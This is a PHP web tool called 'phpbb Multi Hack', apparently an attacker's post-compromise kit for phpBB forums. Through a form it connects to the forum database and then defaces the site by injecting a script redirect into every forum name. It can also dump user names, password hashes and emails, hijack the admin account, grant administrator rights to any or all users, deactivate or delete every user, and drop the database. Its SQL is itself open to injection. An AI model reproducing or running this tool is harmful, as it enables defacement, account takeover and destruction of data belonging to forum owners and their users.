
<style>
input,textarea {
background-color: #000000;

border-width: 3px;


color: #b7f4e8;
}

</style>
<center><body bgcolor=gray >
<title> phpbb Multi Hack</title>


<hr noshade=50>
<hr noshade=50>
<u><font color=white size=6>Phpbb Multi Hack</font></u><br><br>
<font color=black size=6> C0ded By Fisher762</font><br>

<font color=black size=6>InjEctOrS TeaM</font>
<hr noshade=50>
<hr noshade=50>
<u><b><font color=brown size=5>Connection</font></b></u><br><br>
<form method=post >

dbhost : <input name=host value=localhost>&nbsp;&nbsp;&nbsp;&nbsp;dbname :<input name=db value=phpbb><br><br>
dbuser:<input name=user value=root>&nbsp;&nbsp; Passowrd<input name=pass><br><br>
table_prefix :<input name=prefix value=phpbb_><br><br>
<hr noshade=50>
<u><b><font color=brown size=5>Change Index</font></b></u><br><br>
Y0ur index Url <input name=index value=http://hacked.com/index.html><br><br>
<input type=submit value=Update name=update>

<hr noshade=50><br>
<u><b><font color=brown size=5>Sh0w Users Information</font></b></u><br>
<br>


inert user id ::<input name=id><input type=submit name=users value=show><br><font color=gold>note:admin id=2</font>

<hr noshade=50>
<u><b><font color=brown size=5>Change Admin information</font></b></u><br><br>
 set your admin name :<input name=username> set admin password :<input name=password><br><br>
 <input type=submit name=adminc value=change>
<hr noshade=50>

<u><b><font color=brown size=5>Change  users primission </font></b></u><br><br>

insert user id to change his primission to adminstrator::<input name=id><br><br>
<input type=submit value=change name=userp>
<hr noshade=50>
<br><br>

<u><b><font color=brown size=5> Funny Commands</font></b></u>
<br><br>

change all users primision to adminstrator  <input type=submit name=pr value=do> <br><br>

un active all users <input type=submit name=unactive value=do><br><br>
Delete all users <input type=submit name=delete value=delete><br><br>

Delete Database <input name=drop value=delete type=submit> 

<hr noshade=50>
<font color=brown size=6>The result </font>
<br>

</form>



<?

//phpbb multi hack 
//c0ded by fisher762 from InjEctOrS TeaM
//sq7@w.cn
//www.TrYaG.Cc/Cc



$host=$_POST['host'];
$user=$_POST['user'];
$db=$_POST['db'];
$pass=$_POST['pass'];
$prefix=$_POST['prefix'];
$index=$_POST['index'];
if ($update){


$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$set=$prefix.forums;
$result=mysql_query(" update $set set forum_name='<script>location.href=\"$index\"</script>' ") or die(mysql_error());


}


if($users){
	
$set=$prefix.users;	

$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());


$id=$_POST['id'];

$result=mysql_query(" select * from  $set where user_id='$id' ");


while ($row=mysql_fetch_array($result))
{
	
echo "<table border=1><tr><td bgcolor=gold>$row[username]</td><td  bgcolor=red>$row[user_password]</td><td bgcolor=gold>$row[user_email]</td></tr></table>";


}

	
}






if ($pr){
	
	
$set=$prefix.users;	

$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$result=mysql_query(" update $set set user_level= '1'");


}


if ($adminc){
	
	
$set=$prefix.users;			
$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$username=$_POST['username'];
$password=$_POST['password'];
$user_password=md5($password);



$result=mysql_query(" update $set set username='$username', user_password='$user_password ' where user_id=2");


}


if ($unactive){

$set=$prefix.users;	

$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$result=mysql_query(" update $set set user_active= '0'");




}




if ($delete){
	
$set=$prefix.users;			
	
$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$result=mysql_query(" delete from $set");




}

if ($userp){
	
$set=$prefix.users;	
$id=$_POST['id'];		
	
$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$result=mysql_query(" update $set set user_level='1' where user_id='$id'");




}

if ($drop){
	
$db=$_POST['db'];
		
	
$con=mysql_connect($host,$user,$pass) or die("<font color=blue size=4>please check your connection information</font>");
$dbs=mysql_select_db($db) or die(mysql_error());

$result=mysql_query(" drop database '$db' ");




}





if ($result)
echo "<font color=red size=8>oook :)<font>";





?>